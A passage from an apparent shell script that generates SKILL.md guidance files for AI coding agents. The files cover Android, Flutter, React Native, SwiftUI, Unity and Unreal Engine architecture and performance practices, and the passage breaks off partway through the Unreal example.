- Collecting flows with a raw `lifecycleScope.launch`, causing UI updates and database queries to run silently while the phone is locked.
- Executing database queries directly on `Dispatchers.Main`, triggering Android Application Not Responding (ANR) dialogs.

## Concrete Real-World Example
Scenario: An Android weather app continues querying GPS and downloading data in the background after the user presses the home button, wasting battery and crashing on UI updates.
Prompt: Refactor this weather screen coroutine collection to be lifecycle-safe using StateFlow and repeatOnLifecycle.
Application: The AI converts LiveData to `StateFlow` in the `WeatherViewModel`, launches repository calls on `viewModelScope`, and collects state in the Activity inside `repeatOnLifecycle(Lifecycle.State.STARTED)`, automatically pausing collection when the screen is hidden.
EOF

cat << 'EOF' > skills/mobile/android/java/thread-safe-concurrency-models/SKILL.md
---
name: "thread-safe-concurrency-models"
description: "Building stable, leak-free Android applications in Java utilizing java.util.concurrent ExecutorServices, Looper/Handler main-thread dispatch, and WeakReference memory management."
category: "mobile"
subcategory: "android/java"
language: "java"
framework: "android"
technology: "android-java"
difficulty: "advanced"
tags: ["mobile", "android", "java", "concurrency", "executors", "weakreference", "memory-leaks"]
---

# Android Java Thread Safety, ExecutorServices, and WeakReference

## Purpose
Provide concrete guidelines for maintaining and writing high-reliability Android applications in Java, eliminating Activity memory leaks and race conditions.

## When to Use
Use when maintaining enterprise Android Java codebases, writing native SDKs, or managing background threads without Kotlin coroutines.

## Inputs / Context
Java Activity/Fragment, background tasks, thread pools, and UI callback handlers.

## Instructions
1. Eliminate Activity Context Leaks using `WeakReference`:
   - Never pass a direct reference of an `Activity` or `Context` into background threads, async tasks, or static singletons.
   - Wrap Context references in `WeakReference<Context>` and verify `reference.get() != null` before invoking UI callbacks.
2. Manage Background Thread Pools with `ExecutorService`:
   - Replace deprecated `AsyncTask` with bounded thread pools: `Executors.newFixedThreadPool(n)` or custom `ThreadPoolExecutor`.
   - Shut down executors properly when the application terminates.
3. Dispatch to the Main Thread via `Handler`:
   - Use `new Handler(Looper.getMainLooper())` to post UI updates from background worker threads safely.
   - Use static inner classes for Handlers paired with `WeakReference` to avoid capturing implicit outer class references.
4. Ensure Thread Safety on Shared State:
   - Use `AtomicInteger`, `AtomicBoolean`, or `ConcurrentHashMap` for thread-safe counters and dictionaries.
   - Guard multi-step atomic operations with `synchronized` blocks or `ReentrantLock`.
5. Cancel Background Tasks on Lifecycle Teardown:
   - Cancel in-flight `Future<?>` handles in `onDestroy()` (`future.cancel(true)`).

## Constraints / Rules
- Never use the deprecated `AsyncTask` in modern Android code.
- Never hold strong references to `Activity` instances in background worker runnables.
- Avoid performing disk or network I/O on the Android Main Looper thread.

## Workflow
1. Define background executor service with bounded thread pool.
2. Implement background runnable using `WeakReference` to caller callbacks.
3. Post results to UI via `Handler(Looper.getMainLooper())`.
4. Cancel pending tasks in `onDestroy()`.
5. Verify zero memory leaks using LeakCanary.

## Expected Output
Thread-safe Android Java service and Activity code featuring ExecutorService, static handlers, WeakReference callbacks, and clean lifecycle cancellation.

## Validation Checklist
- [ ] Are Activity references wrapped in `WeakReference`?
- [ ] Are Handlers declared as static inner classes to prevent memory leaks?
- [ ] Are UI updates posted to `Looper.getMainLooper()`?
- [ ] Are in-flight futures cancelled during `onDestroy()`?
- [ ] Does LeakCanary report 0 retained Activity instances?

## Common Mistakes & Antipatterns
- Creating an anonymous `new Thread(new Runnable() { ... }).start()` inside an Activity, keeping the entire Activity and all its View bitmaps alive in memory forever if the thread runs long.
- Modifying UI Views directly from a background thread, throwing `CalledFromWrongThreadException`.
- Using unbounded thread executors, creating hundreds of threads and crashing the process with `OutOfMemoryError: pthread_create failed`.

## Concrete Real-World Example
Scenario: An enterprise Android Java barcode scanner leaks 50MB of memory on every device rotation because a background thread holds a strong reference to the destroyed Activity.
Prompt: Fix this Activity context memory leak in Java using WeakReference and modern Executors.
Application: The AI replaces the raw thread with a managed `ExecutorService`, converts the callback listener to a `WeakReference<ScanCallback>`, posts results through a static `Handler(Looper.getMainLooper())`, and cancels pending futures in `onDestroy()`, resolving all memory leaks.
EOF

cat << 'EOF' > skills/mobile/android/jetpack-compose/declarative-ui-state/SKILL.md
---
name: "declarative-ui-state"
description: "Architecting performant Android UIs with Jetpack Compose using unidirectional data flow (UDF), stable types, recomposition optimization, and derivedStateOf."
category: "mobile"
subcategory: "android/jetpack-compose"
language: "kotlin"
framework: "jetpack-compose"
technology: "android-compose"
difficulty: "advanced"
tags: ["mobile", "android", "jetpack-compose", "recomposition", "udf", "stable-types"]
---

# Jetpack Compose Declarative UI Architecture and Recomposition

## Purpose
Instruct AI agents to author idiomatic Jetpack Compose user interfaces that adhere to Unidirectional Data Flow, avoid unnecessary recompositions, and deliver 60/120 FPS performance.

## When to Use
Use when creating Android screen layouts, design system components, interactive animations, or refactoring XML layouts to Jetpack Compose.

## Inputs / Context
Screen state model, user interaction events, design tokens, and Compose theme configuration.

## Instructions
1. Adhere to Unidirectional Data Flow (UDF):
   - State flows DOWN: Pass immutable data models into composable functions.
   - Events flow UP: Pass lambda event handlers (`onItemClicked: (Id) -> Unit`) up to the ViewModel; composables should not mutate state directly.
2. Hoist State Cleanly:
   - Make composables stateless whenever possible by hoisting state to the caller or ViewModel to maximize reusability and testability.
3. Optimize Recomposition Performance:
   - Use `remember` with keys to cache expensive calculations across recompositions.
   - Use `derivedStateOf` when reading high-frequency state (e.g., scroll position) to only trigger recomposition when a calculated threshold changes.
   - Annotate domain models with `@Immutable` or `@Stable` when passing external types to ensure the Compose compiler treats them as stable.
4. Pass Lambdas without Unnecessary Recomposition:
   - Avoid creating new lambda allocations inside parameter lists during recomposition; pass method references or remember lambdas.
5. Lazy Lists Optimization:
   - Always provide a stable, unique `key` parameter to items in `LazyColumn` and `LazyRow` (e.g., `items(list, key = { it.id })`).
   - Use `contentType` to help Compose reuse view compositions across similar items.
6. Support Material 3 Theming and Dynamic Color:
   - Consume values through `MaterialTheme.colorScheme` and `MaterialTheme.typography`.

## Constraints / Rules
- Never write side-effects (like logging, network requests, or database writes) directly in the body of a composable; wrap them in `LaunchedEffect` or `SideEffect`.
- Never mutate state variables directly without Compose state holders (`mutableStateOf`).
- Do not pass unstable collections (like raw `List<T>`) into composables without `@Immutable` wrappers if avoiding recomposition is critical.

## Workflow
1. Define immutable UI State sealed class.
2. Structure screen composable consuming `StateFlow` via `collectAsStateWithLifecycle()`.
3. Create stateless child composables receiving data and event lambdas.
4. Provide unique keys on `LazyColumn` items.
5. Audit recomposition counts using the Android Studio Layout Inspector.

## Expected Output
Clean Jetpack Compose UI code with unidirectional state hoisting, stable types, `derivedStateOf` optimizations, and zero side-effect leakage.

## Validation Checklist
- [ ] Does the UI follow Unidirectional Data Flow (state down, events up)?
- [ ] Are unique keys provided for all `LazyColumn` and `LazyRow` items?
- [ ] Are high-frequency scroll states wrapped in `derivedStateOf`?
- [ ] Are side effects encapsulated inside `LaunchedEffect`?
- [ ] Does Layout Inspector verify that unaffected composables skip recomposition?

## Common Mistakes & Antipatterns
- Reading scroll position directly in a top-level composable without `derivedStateOf`, causing the entire screen to recompose on every single pixel of scrolling.
- Omitting `key` in `LazyColumn`, causing Compose to recreate all list items when an item is inserted or deleted.
- Triggering an API call directly in the composable body, causing an infinite loop of network calls on every recomposition.

## Concrete Real-World Example
Scenario: A social media feed in Jetpack Compose stutters during scrolling because the entire feed recomposes every time the user scrolls 1 pixel to check if the 'Scroll to Top' button should appear.
Prompt: Optimize this Jetpack Compose feed layout to eliminate unnecessary recompositions.
Application: The AI wraps the scroll calculation in `val showButton by remember { derivedStateOf { listState.firstVisibleItemIndex > 0 } }`, assigns unique keys to `LazyColumn` items, and isolates the button rendering, eliminating 99% of recompositions during scroll.
EOF

cat << 'EOF' > skills/mobile/android/xml/legacy-constraint-layout-modernization/SKILL.md
---
name: "legacy-constraint-layout-modernization"
description: "Modernizing legacy Android XML layouts using flat ConstraintLayout hierarchies, ViewBinding type-safety, accessibility attributes, and DayNight themes."
category: "mobile"
subcategory: "android/xml"
language: "xml"
framework: "android"
technology: "android-views"
difficulty: "intermediate"
tags: ["mobile", "android", "xml", "constraintlayout", "viewbinding", "modernization"]
---

# Android XML ConstraintLayout and ViewBinding Modernization

## Purpose
Provide concrete patterns for optimizing legacy Android XML layouts, flattening deeply nested view trees, and replacing brittle `findViewById` with ViewBinding.

## When to Use
Use when maintaining existing Android View-based XML codebases, optimizing slow XML layout rendering, or refactoring legacy RelativeLayouts.

## Inputs / Context
Existing XML layout file, nested View hierarchy, Activity/Fragment class, and theme styles.

## Instructions
1. Flatten Deep View Hierarchies with `ConstraintLayout`:
   - Replace nested `LinearLayout` and `RelativeLayout` trees with a single, flat `androidx.constraintlayout.widget.ConstraintLayout`.
   - Deep view hierarchies (> 5 levels) cause exponential layout measurement passes and dropped frames.
2. Utilize ConstraintLayout Features:
   - `Guidelines`: Virtual horizontal or vertical alignment anchors.
   - `Barriers`: Dynamic boundaries that adjust based on the sizing of multiple independent views.
   - `Chains`: Evenly distribute views horizontally or vertically with spread, spread_inside, or packed styles.
3. Replace `findViewById` and Synthetic Imports with ViewBinding:
   - Enable ViewBinding in `build.gradle` (`buildFeatures { viewBinding true }`).
   - Clean up ViewBinding references in Fragment `onDestroyView()` (`_binding = null`) to prevent memory leaks.
4. Support Dark Mode and Dynamic Theming:
   - Use theme attributes (`?attr/colorSurface`, `?attr/colorOnSurface`) instead of hardcoded hex colors (`#FFFFFF`) in layout XML.
5. Provide Complete Accessibility Attributes:
   - Set `android:contentDescription` on all `ImageView` and icon buttons (or `android:importantForAccessibility="no"` for decorative graphics).
   - Ensure `android:labelFor` is linked to form input fields.

## Constraints / Rules
- Never use `findViewById` in modern Android development; use ViewBinding.
- Avoid nesting `ConstraintLayout` inside another `ConstraintLayout`.
- Never hardcode dimensions in pixels (`px`); always use density-independent pixels (`dp`) for layout and scale-independent pixels (`sp`) for text.

## Workflow
1. Enable ViewBinding in module gradle file.
2. Flatten nested XML hierarchy into a single `ConstraintLayout`.
3. Anchor views using constraints, guidelines, and barriers.
4. Replace `findViewById` calls in Activity/Fragment with binding references.
5. Set `_binding = null` in Fragment `onDestroyView`.

## Expected Output
Flat, high-performance XML layout file with ConstraintLayout anchors, paired with type-safe ViewBinding integration code.

## Validation Checklist
- [ ] Is layout tree flattened to a single ConstraintLayout level?
- [ ] Is ViewBinding used with complete nullification in Fragment `onDestroyView()`?
- [ ] Are dimensions specified in `dp` and font sizes in `sp`?
- [ ] Are colors referenced via theme attributes (`?attr/...`)?
- [ ] Are content descriptions provided for all visual elements?

## Common Mistakes & Antipatterns
- Forgetting to set `_binding = null` in Fragment `onDestroyView()`, keeping the entire View hierarchy in memory after the Fragment view is destroyed.
- Nesting 4 layers of `LinearLayout` to center an icon and text, doubling layout measurement time on older devices.
- Using hardcoded text strings in XML instead of `@string/...` resources.

## Concrete Real-World Example
Scenario: An Android checkout layout takes 300ms to inflate because it contains 6 nested `LinearLayout` elements and crashes frequently due to null pointer exceptions from `findViewById`.
Prompt: Flatten this XML layout into ConstraintLayout and implement ViewBinding in Kotlin.
Application: The AI converts the nested XML into a single flat `ConstraintLayout` using horizontal chains and a vertical barrier, sets dimensions in `dp`, enables ViewBinding in the Fragment, safely cleans up `_binding` in `onDestroyView()`, cutting layout inflation time by 65%.
EOF

cat << 'EOF' > skills/mobile/flutter/bloc-architecture-and-rendering/SKILL.md
---
name: "bloc-architecture-and-rendering"
description: "Architecting scalable Flutter apps using the Business Logic Component (BLoC) pattern, Equatable immutability, fine-grained BlocBuilder rebuilds, and const constructors."
category: "mobile"
subcategory: "flutter"
language: "dart"
framework: "flutter"
technology: "flutter-bloc"
difficulty: "advanced"
tags: ["mobile", "flutter", "dart", "bloc", "state-management", "performance", "const"]
---

# Flutter BLoC Architecture, Immutability, and Render Optimization

## Purpose
Instruct AI agents to author high-performance, testable Flutter applications using the BLoC pattern, eliminating unnecessary widget rebuilds and maintaining strict state immutability.

## When to Use
Use when architecting enterprise Flutter applications, managing complex state lifecycles, or optimizing laggy Flutter widget trees.

## Inputs / Context
Feature requirements, domain state model, BLoC events, API service dependencies, and widget hierarchy.

## Instructions
1. Structure State Management using BLoC (Business Logic Component):
   - Events (Inputs): Dispatched by the UI to request state changes (e.g., `LoadFeedEvent`).
   - States (Outputs): Emitted by the BLoC to represent UI state (e.g., `FeedLoadedState`).
   - BLoC: Pure business component mapping `(Event) -> Stream<State>`.
2. Ensure Complete State Immutability with `Equatable`:
   - All State and Event classes must extend `Equatable` and implement `props` to enable value-based equality checking.
   - Never mutate state objects in place; emit new copies using `.copyWith()`.
3. Granular Widget Rebuilding:
   - Use `BlocBuilder` with `buildWhen: (previous, current) => previous.attribute != current.attribute` to prevent rebuilding entire screens when only a single property changes.
   - Use `BlocListener` with `listenWhen` for one-time side-effects (displaying SnackBar, navigating, showing dialogs); never perform navigation inside a `BlocBuilder`.
4. Maximize Use of `const` Constructors:
   - Add `const` to all static widgets and subtrees; Flutter skips re-allocating and rebuilding `const` widgets entirely during build passes.
5. Provide BLoCs Scoped via `BlocProvider`:
   - Scope BLoC instances only to the widget subtrees that require them; close/dispose BLoC streams automatically via `BlocProvider`.
6. Repaint Boundaries for Heavy Animations:
   - Wrap frequently repainting widgets in `RepaintBoundary` to isolate canvas repainting from the rest of the screen.

## Constraints / Rules
- Never execute navigation or display SnackBars inside `BlocBuilder`; use `BlocListener`.
- Avoid calling `setState()` inside large StatefulWidget trees when BLoC is managing state.
- Do not omit `const` constructors on immutable widget declarations.

## Workflow
1. Define BLoC Events and States extending `Equatable`.
2. Implement BLoC class with event handlers (`on<Event>((event, emit) => ...)`).
3. Inject BLoC via `BlocProvider`.
4. Build UI with scoped `BlocBuilder` and `buildWhen` filters.
5. Author unit tests using `bloc_test` verifying emitted state streams.

## Expected Output
Clean Flutter BLoC implementation with Equatable states, granular `BlocBuilder` rebuild scoping, and `bloc_test` unit coverage.

## Validation Checklist
- [ ] Do all state and event classes extend `Equatable`?
- [ ] Is `buildWhen` configured on `BlocBuilder` to prevent full-screen rebuilds?
- [ ] Are one-off side effects handled via `BlocListener`?
- [ ] Are `const` constructors applied to all immutable widgets?
- [ ] Are BLoCs unit-tested using the `bloc_test` library?

## Common Mistakes & Antipatterns
- Navigating to a new route inside `BlocBuilder`, causing navigation to trigger multiple times whenever the widget tree rebuilds.
- Forgetting to extend `Equatable` in States, causing BLoC to emit states that Flutter considers identical by reference, failing to trigger UI updates.
- Wrapping the entire `Scaffold` in a single `BlocBuilder`, causing the entire screen including app bars and tabs to redraw on minor state changes.

## Concrete Real-World Example
Scenario: A Flutter crypto portfolio app lags during scrolling because real-time price updates cause the entire screen, including navigation drawers and headers, to rebuild 10 times per second.
Prompt: Optimize this Flutter portfolio screen using BLoC fine-grained rebuilds and const constructors.
Application: The AI splits the monolithic screen into modular child widgets, isolates price tickers inside localized `BlocBuilder<CryptoBloc, CryptoState>(buildWhen: ...)`, adds `const` to headers and scaffold elements, and routes alert dialogs through a `BlocListener`, restoring 60 FPS scrolling.
EOF

cat << 'EOF' > skills/mobile/react-native/new-architecture-bridging/SKILL.md
---
name: "new-architecture-bridging"
description: "Architecting high-performance React Native applications leveraging the New Architecture, TurboModules (JSI), Fabric renderer, and Hermes engine optimization."
category: "mobile"
subcategory: "react-native"
language: "typescript"
framework: "react-native"
technology: "react-native-new-arch"
difficulty: "advanced"
tags: ["mobile", "react-native", "fabric", "turbomodules", "jsi", "hermes", "performance"]
---

# React Native New Architecture with Fabric and TurboModules

## Purpose
Guide AI in developing React Native applications compatible with the New Architecture, leveraging direct C++ JavaScript Interface (JSI) calls and synchronous Fabric UI rendering.

## When to Use
Use when building high-performance React Native apps, authoring native modules, optimizing cross-platform bridging, or eliminating bridge serialization lag.

## Inputs / Context
Component specifications, native bridge requirements, JavaScript/TypeScript code, and native platform bindings (Kotlin/Swift).

## Instructions
1. Leverage the React Native New Architecture:
   - Fabric Renderer: Synchronous rendering pipeline replacing the asynchronous legacy bridge, eliminating visual layout jumps and white screen flashes.
   - TurboModules: Lazy-loaded, synchronous native modules interacting with JavaScript via C++ JavaScript Interface (JSI) rather than JSON serialization over a bridge.
2. Define Type-Safe Native Module Specifications with Codegen:
   - Author native module interfaces using strict TypeScript or Flow specs extending `TurboModule`.
   - Run Codegen to generate strongly typed C++ interfaces for both iOS and Android.
3. Optimize for the Hermes Engine:
   - Enable Hermes JavaScript engine (`hermesEnabled: true`).
   - Hermes precompiles JavaScript into bytecode at build time, slashing app startup time and memory footprint.
4. Avoid Native Bridge Bottlenecks:
   - Never pass large binary buffers or high-frequency telemetry (e.g., 60Hz touch events) across the bridge; handle gestures natively using `react-native-gesture-handler` and `react-native-reanimated`.
5. Eliminate Re-Render Overhead:
   - Use `useCallback` and `React.memo` on list item renderers.
   - Use FlashList by Shopify instead of standard `FlatList` for 5x faster list rendering and memory recycling.
6. Handle Platform-Specific Insets:
   - Wrap roots in `SafeAreaProvider` and consume `useSafeAreaInsets()` to prevent UI overlap with notches and home indicators.

## Constraints / Rules
- Never write native bridge calls that pass massive JSON payloads synchronously.
- Avoid legacy asynchronous bridge modules in New Architecture enabled projects.
- Do not run continuous animation loops on the JS thread; run all animations on the UI thread via Reanimated worklets.

## Workflow
1. Define TurboModule TypeScript specification.
2. Generate C++ scaffolding via React Native Codegen.
3. Implement native methods in Kotlin and Swift adhering to generated interfaces.
4. Configure Hermes and Fabric in project builds.
5. Verify 60/120 FPS performance in React DevTools Profiler.

## Expected Output
React Native New Architecture component or TurboModule code featuring type-safe Codegen specs, JSI native bindings, and Hermes optimization.

## Validation Checklist
- [ ] Are native modules typed using TurboModule Codegen specifications?
- [ ] Is Hermes engine enabled for bytecode precompilation?
- [ ] Are high-frequency animations executed on the UI thread via worklets?
- [ ] Are virtualized lists powered by FlashList with precomputed item sizes?
- [ ] Does UI rendering avoid legacy asynchronous bridge serialization?

## Common Mistakes & Antipatterns
- Passing 60 FPS scroll updates from native to JS thread to compute layout positions, causing severe stutter and lag.
- Writing untyped legacy `NativeModules.MyModule` calls without compile-time parameter verification.
- Failing to clean up native event listeners in React `useEffect` hooks, leaking native memory.

## Concrete Real-World Example
Scenario: A React Native drawing app stutters because touch coordinates are serialized over the legacy bridge as JSON, causing 50ms of input lag.
Prompt: Refactor this drawing interaction to use the React Native New Architecture and Reanimated worklets.
Application: The AI implements a TurboModule with C++ JSI direct memory binding, migrates gesture tracking to `react-native-gesture-handler` running directly on the UI thread via Reanimated worklets, eliminating bridge latency and providing instant 120Hz drawing responsiveness.
EOF

cat << 'EOF' > skills/mobile/ios/swiftui-navigation-and-state/SKILL.md
---
name: "swiftui-navigation-and-state"
description: "Architecting modern iOS applications using SwiftUI, the Swift 5.9+ `@Observable` macro, type-safe `NavigationStack`, and actor-isolated Swift concurrency."
category: "mobile"
subcategory: "ios"
language: "swift"
framework: "swiftui"
technology: "ios-swift"
difficulty: "advanced"
tags: ["mobile", "ios", "swift", "swiftui", "navigationstack", "observable", "actors"]
---

# SwiftUI NavigationStack Architecture and Observation Framework

## Purpose
Instruct AI agents to author clean, modern iOS applications in SwiftUI leveraging the `@Observable` macro, type-safe programmatic navigation, and structured Swift concurrency.

## When to Use
Use when building modern iOS applications (iOS 16/17+), designing SwiftUI views, managing app navigation, or integrating Swift Concurrency (`async/await`, `actor`).

## Inputs / Context
View mockups, state models, navigation route graph, and async network repositories.

## Instructions
1. Manage State using the Modern `@Observable` Macro (Swift 5.9 / iOS 17+):
   - Replace legacy `ObservableObject` and `@Published` with the `@Observable` macro on model classes.
   - In Views, declare models using `@State var model = Model()` (for owned instances) or pass directly via environment (`@Environment(Model.self)`).
   - `@Observable` performs fine-grained tracking: views only invalidate and redraw when the specific properties they access actually change.
2. Implement Type-Safe Programmatic Navigation using `NavigationStack`:
   - Replace deprecated `NavigationLink(destination:)` with `NavigationStack(path: $navPath)`.
   - Model all application destinations as a Hashable enum (`enum AppRoute: Hashable`).
   - Use `.navigationDestination(for: AppRoute.self) { route in ... }` to decouple link triggers from destination views.
3. Swift Concurrency and Actor Isolation:
   - Mark UI-bound ViewModels with `@MainActor` to guarantee state mutations occur on the main thread.
   - Use `.task { await loadData() }` on views to launch asynchronous work automatically tied to the view's lifecycle (auto-cancelled on view disappearance).
   - Isolate shared mutable data in background tasks using `actor` types.
4. Support Dynamic Type and Accessibility:
   - Use semantic typography (`.font(.headline)`, `.font(.body)`) so text scales with the user's system Dynamic Type preferences.
   - Add `.accessibilityElement(children: .combine)` and accessibility labels.

## Constraints / Rules
- Never use the deprecated `NavigationView` in iOS 16+ codebases; always use `NavigationStack`.
- Never execute background network calls without `@MainActor` boundary synchronization when updating UI state.
- Avoid passing massive objects via `@Binding`; use `@Observable` models.

## Workflow
1. Define `@Observable` ViewModel with `@MainActor` isolation.
2. Define `AppRoute` enum conforming to `Hashable`.
3. Construct `NavigationStack(path: $path)` with `.navigationDestination`.
4. Fetch data using the `.task` view modifier.
5. Verify Dynamic Type scaling and dark mode theme transitions.

## Expected Output
Idiomatic SwiftUI code featuring the `@Observable` macro, type-safe `NavigationStack`, `@MainActor` concurrency, and complete accessibility support.

## Validation Checklist
- [ ] Is `@Observable` used instead of legacy `ObservableObject`?
- [ ] Is navigation handled programmatically via `NavigationStack` and Hashable routes?
- [ ] Are ViewModels annotated with `@MainActor`?
- [ ] Is asynchronous work launched via `.task` with auto-cancellation?
- [ ] Does text scale dynamically with iOS system font size settings?

## Common Mistakes & Antipatterns
- Using deprecated `NavigationLink(destination: DetailView())` which initializes the destination view immediately on parent render, causing premature data fetching.
- Updating UI state from background threads without `@MainActor`, triggering Xcode runtime concurrency warnings.
- Using `DispatchQueue.main.async` in modern Swift instead of idiomatic `async/await` and `@MainActor`.

## Concrete Real-World Example
Scenario: An iOS app crashes and experiences memory leaks due to legacy `NavigationView` nested links and manual background thread dispatches.
Prompt: Modernize this iOS settings screen to use SwiftUI NavigationStack and the Swift 5.9 `@Observable` macro.
Application: The AI creates an `@Observable @MainActor class SettingsViewModel`, models routes via `enum SettingsRoute: Hashable`, constructs a `NavigationStack(path: $path)` with decoupled `.navigationDestination`, loads preferences in `.task`, and binds controls to observable properties.
EOF

cat << 'EOF' > skills/game-development/unity/gameplay-systems-architecture/SKILL.md
---
name: "gameplay-systems-architecture"
description: "Architecting modular, performant Unity games using ScriptableObject data architecture, zero-allocation Object Pooling, and decoupled event channels."
category: "game-development"
subcategory: "unity"
language: "csharp"
framework: "unity"
technology: "unity-engine"
difficulty: "advanced"
tags: ["game-development", "unity", "csharp", "scriptable-objects", "object-pooling", "gameplay-systems"]
---

# Unity Gameplay Architecture with ScriptableObjects and Object Pooling

## Purpose
Instruct AI agents to author scalable, high-performance Unity gameplay systems in C# that eliminate Garbage Collection pauses and decouple game systems using ScriptableObjects.

## When to Use
Use when creating Unity game mechanics, projectile systems, inventory management, audio managers, or optimizing mobile/console game frame rates.

## Inputs / Context
Game mechanics specification, entity definitions, prefab references, performance budgets, and event hooks.

## Instructions
1. Decouple Systems using ScriptableObject Event Channels:
   - Avoid direct tight references between game systems (e.g., Player should not directly reference UIManager or SoundManager).
   - Use ScriptableObjects as modular Event Channels (e.g., `GameEventSO`, `IntEventChannelSO`): publishers invoke `Raise()`, listeners subscribe via `OnEventRaised`.
2. Data-Driven Design with ScriptableObject Configuration:
   - Store weapon stats, enemy types, and balancing parameters in `ScriptableObject` asset files rather than hardcoding them in `MonoBehaviour` scripts.
3. Zero-Allocation Object Pooling:
   - Never call `Instantiate()` and `Destroy()` repeatedly for high-frequency game entities (projectiles, particle effects, damage numbers, audio clips).
   - Use Unity's native `UnityEngine.Pool.ObjectPool<T>`:
     * Pre-warm the pool at scene start.
     * Call `pool.Get()` on spawn and `pool.Release()` on death/despawn.
     * Eliminates Garbage Collection allocations and prevents frame-rate stutter.
4. Cache Component References and String Hashes:
   - Never call `GetComponent<T>()` or `FindObjectOfType<T>()` inside `Update()`. Cache references in `Awake()` or `Start()`.
   - Cache animator and shader property IDs: use `Animator.StringToHash("Speed")` rather than passing string names in `Update()`.
5. Physics and Update Rules:
   - Run all Rigidbody physics calculations inside `FixedUpdate()`, never `Update()`.
   - Scale movement and frame-dependent calculations by `Time.deltaTime` (in `Update`) or `Time.fixedDeltaTime` (in `FixedUpdate`).

## Constraints / Rules
- Never call `GameObject.Find()` or `GetComponent()` inside `Update()` or per-frame loops.
- Never instantiate and destroy high-frequency game objects dynamically during gameplay.
- Do not use physics raycasts without layer masks (`Physics.Raycast` must always specify a `LayerMask`).

## Workflow
1. Define ScriptableObject event channels and data containers.
2. Implement gameplay components subscribing to event channels.
3. Build ObjectPool for spawning and despawning entities.
4. Cache all component handles in `Awake()`.
5. Profile frame rate and GC Alloc in the Unity Profiler.

## Expected Output
High-performance Unity C# scripts featuring ScriptableObject architecture, `ObjectPool<T>` integration, and zero per-frame GC allocations.

## Validation Checklist
- [ ] Are high-frequency entities recycled using `ObjectPool<T>`?
- [ ] Are systems decoupled using ScriptableObject event channels?
- [ ] Are all `GetComponent` calls cached in `Awake()`?
- [ ] Does physics code execute exclusively in `FixedUpdate()`?
- [ ] Does Unity Profiler show 0B GC allocation on per-frame update loops?

## Common Mistakes & Antipatterns
- Calling `Instantiate(bulletPrefab)` and `Destroy(bullet, 2f)` 50 times per second in a shooter game, creating massive memory fragmentation and triggering 50ms GC freezes.
- Calling `Camera.main` in `Update()` (in older Unity versions, this internally executes an expensive `FindObjectWithTag` call on every frame).
- Hardcoding game variables directly in C# scripts, forcing code recompilation for simple balance tweaks.

## Concrete Real-World Example
Scenario: A mobile 2D space shooter drops from 60 FPS to 22 FPS whenever the player fires a weapon due to continuous GameObject instantiation and garbage collection spikes.
Prompt: Optimize this Unity weapon firing system to maintain solid 60 FPS without GC allocations.
Application: The AI replaces dynamic `Instantiate`/`Destroy` with Unity's `ObjectPool<Projectile>`, caches particle and audio components, moves bullet stats into a `WeaponConfigSO` ScriptableObject, and converts bullet death to `pool.Release()`, eliminating all GC allocations.
EOF

cat << 'EOF' > skills/game-development/unreal-engine/gameplay-framework-cpp-blueprints/SKILL.md
---
name: "gameplay-framework-cpp-blueprints"
description: "Architecting scalable Unreal Engine games utilizing the Gameplay Framework (GameMode, GameState, PlayerController, Character), C++ performance, and Blueprint visual scripting."
category: "game-development"
subcategory: "unreal-engine"
language: "cpp"
framework: "unreal-engine"
technology: "unreal-engine-5"
difficulty: "advanced"
tags: ["game-development", "unreal-engine", "cpp", "blueprints", "gameplay-framework", "ue5"]
---

# Unreal Engine Gameplay Framework in C++ and Blueprints

## Purpose
Instruct AI agents to author robust Unreal Engine 5 gameplay code that respects the engine's canonical Gameplay Framework hierarchy and cleanly balances C++ for performance with Blueprints for iteration.

## When to Use
Use when architecting Unreal Engine 5 games, building character controllers, implementing multiplayer networking foundations, or designing game rules.

## Inputs / Context
Game genre, multiplayer requirements (server vs client), character capabilities, and game state rules.

## Instructions
1. Adhere Strictly to the Unreal Gameplay Framework Roles:
   - `AGameModeBase` / `AGameMode`: Exists ONLY on the server in multiplayer. Enforces game rules, win/loss conditions, player spawning, and match flow.
   - `AGameStateBase` / `AGameState`: Replicated to all clients. Tracks global game data (score, match timer, active objectives).
   - `APlayerController`: Represents the human player interface. Possesses a Pawn/Character. Exists on the owning client and the server. Handles UI, input bindings, and camera control.
   - `APlayerState`: Replicated to all clients. Tracks individual player statistics (player name, ping, score, health).
   - `APawn` / `ACharacter`: The physical avatar in the 3D world.
2. C++ Base, Blueprint Leaf Architecture:
   - Write core systems, mathematical algorithms, networking logic, and performance-critical loops in C++.
   - Expose properties using `UPROPERTY(EditAnywhere, BlueprintReadWrite, Category = "...")`.
   - Expose functions using `UFUNCTION(BlueprintCallable, Category = "...")`.
   - Create Blueprint subclasses of C++ classes for visual design, audio assignments, and animation setup.
3. Optimize Ticking (`Tick` Function):
   - Disable ticking (`PrimaryActorTick.bCanEverTick = false;`) on all Actors and Components that do not strictly require per-frame updates.
   - Use timers (`FTimerManager::SetTimer`) or event-driven architecture instead of polling inside `Tick`.
4. Memory Management and Garbage Collection:
   - Always decorate `UObject` and `AActor` raw pointers with `UPROPERTY()` to prevent the Unreal Garbage Collector from prematurely recycling active references.
   - Use `TWeakObjectPtr<T>` when referencing objects without owning them to avoid dangling pointers.

## Constraints / Rules
- Never write game-rule enforcement logic inside `ACharacter` or `APlayerController` in multiplayer games; game rules belong exclusively in `AGameMode`.
- Never execute heavy algorithmic loops in Blueprint graphs when C++ is appropriate.
- Avoid leaving `bCanEverTick = true` on static or event-driven actors.

## Workflow
1. Create C++ base classes inheriting from `ACharacter`, `APlayerController`, `AGameModeBase`.
2. Declare gameplay properties with `UPROPERTY` and functions with `UFUNCTION`.
3. Disable `Tick` on non-ticking classes.
4. Derive Blueprint classes from C++ base classes and assign mesh/sound assets in editor.
5. Verify multiplayer replication and frame rates using `stat unit`.

## Expected Output
High-performance Unreal Engine C++ header and source files adhering to the Gameplay Framework, exposed cleanly to Blueprints.

## Validation Checklist
- [ ] Are game roles mapped to correct Gameplay Framework classes?
- [ ] Are C++ properties exposed via `UPROPERTY` with proper categories?
- [ ] Is `PrimaryActorTick.bCanEverTick = false` configured on non-ticking actors?
- [ ] Are raw UObject pointers protected with `UPROPERTY()` against GC deletion?
- [ ] Is server-authoritative logic confined to GameMode and server functions?

## Common Mistakes & Antipatterns
- Putting game win conditions inside the client-side `APlayerController`, allowing clients to cheat or break multiplayer synchronization.
- Leaving `Tick()` enabled on 500 environmental actors, wasting CPU time evaluating empty tick functions every frame.
- Storing a raw C++ pointer to an Actor without `UPROPERTY()`, leading to random crashes when Unreal GC reclaims the memory.

## Concrete Real-World Example
Scenario: An Unreal Engine 5 shooter has severe frame drops and crashes randomly because 200 enemy spawn points have `Tick` enabled and store unmanaged raw C++ pointers.
